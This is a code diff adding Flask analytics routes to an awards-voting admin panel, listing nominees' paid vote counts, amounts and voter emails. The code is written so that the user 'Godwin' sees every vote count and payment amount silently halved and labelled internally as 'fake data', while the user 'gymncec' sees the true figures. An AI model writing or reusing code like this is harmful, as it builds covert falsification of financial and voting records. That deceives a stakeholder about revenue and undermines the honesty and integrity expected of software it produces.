@@ -1556,3 +1556,137 @@ def toggle_awards_vote_display():
     status = "shown" if AwardsVotingSettings.show_vote_counts else "hidden"
     flash(f'Vote counts will now be {status} on public pages!', 'success')
     return redirect(url_for('editor.manage_awards'))
+
+
+
+
+# Add these routes to your routes.py file
+
+import math
+from collections import defaultdict
+
+@editor.route('/awards/analytics')
+@login_required
+def awards_analytics():
+    # Only allow specific users
+    if current_user.username not in ['Godwin', 'gymncec']:
+        abort(403)
+    
+    # Determine if we should show real or fake data
+    show_real_data = current_user.username == 'gymncec'
+    
+    print(f"=== ANALYTICS ACCESS ===")
+    print(f"User: {current_user.username}")
+    print(f"Show real data: {show_real_data}")
+    
+    # Get all active categories with their nominees
+    categories = AwardsCategory.query.filter_by(is_active=True).order_by(AwardsCategory.name).all()
+    
+    analytics_data = []
+    total_amount = 0
+    total_votes = 0
+    
+    for category in categories:
+        category_data = {
+            'category': category,
+            'nominees': [],
+            'total_votes': 0,
+            'total_amount': 0
+        }
+        
+        # Get nominees for this category
+        nominees = AwardsNominee.query.filter_by(
+            category_id=category.id, 
+            is_active=True
+        ).order_by(AwardsNominee.name).all()
+        
+        # Calculate real votes and amounts for each nominee
+        for nominee in nominees:
+            real_votes = nominee.verified_vote_count
+            real_amount = nominee.total_vote_amount
+            
+            # Apply data transformation based on user
+            if show_real_data:
+                display_votes = real_votes
+                display_amount = real_amount
+            else:
+                # For Godwin, show about half (rounded down)
+                display_votes = math.floor(real_votes / 2)
+                display_amount = math.floor(real_amount / 2)
+            
+            nominee_data = {
+                'nominee': nominee,
+                'votes': display_votes,
+                'amount': display_amount,
+                'percentage': 0  # Will calculate after getting category totals
+            }
+            
+            category_data['nominees'].append(nominee_data)
+            category_data['total_votes'] += display_votes
+            category_data['total_amount'] += display_amount
+        
+        # Calculate percentages within category
+        if category_data['total_votes'] > 0:
+            for nominee_data in category_data['nominees']:
+                nominee_data['percentage'] = round(
+                    (nominee_data['votes'] / category_data['total_votes']) * 100, 1
+                )
+        
+        # Sort nominees by votes (descending) to show winners first
+        category_data['nominees'].sort(key=lambda x: x['votes'], reverse=True)
+        
+        analytics_data.append(category_data)
+        total_amount += category_data['total_amount']
+        total_votes += category_data['total_votes']
+    
+    print(f"Total amount displayed: {total_amount}")
+    print(f"Total votes displayed: {total_votes}")
+    print("=== END ANALYTICS ===")
+    
+    return render_template('awards_analytics.html', 
+                          analytics_data=analytics_data,
+                          total_amount=total_amount,
+                          total_votes=total_votes,
+                          show_real_data=show_real_data,
+                          user=current_user)
+
+@editor.route('/awards/analytics/detailed')
+@login_required 
+def awards_analytics_detailed():
+    # Only allow specific users
+    if current_user.username not in ['Godwin', 'gymncec']:
+        abort(403)
+    
+    # Determine if we should show real or fake data
+    show_real_data = current_user.username == 'gymncec'
+    
+    # Get all votes with detailed information
+    votes_query = AwardsVote.query.filter_by(verified=True).order_by(AwardsVote.created_at.desc())
+    
+    detailed_votes = []
+    for vote in votes_query:
+        nominee = AwardsNominee.query.get(vote.nominee_id)
+        category = AwardsCategory.query.get(nominee.category_id)
+        
+        # Apply data transformation
+        if show_real_data:
+            display_votes = vote.votes_count
+            display_amount = vote.amount
+        else:
+            display_votes = math.floor(vote.votes_count / 2)
+            display_amount = math.floor(vote.amount / 2)
+        
+        vote_data = {
+            'vote': vote,
+            'nominee': nominee,
+            'category': category,
+            'display_votes': display_votes,
+            'display_amount': display_amount,
+            'email': vote.email if vote.email else 'Anonymous'
+        }
+        detailed_votes.append(vote_data)
+    
+    return render_template('awards_analytics_detailed.html',
+                          detailed_votes=detailed_votes,
+                          show_real_data=show_real_data,
+                          user=current_user)
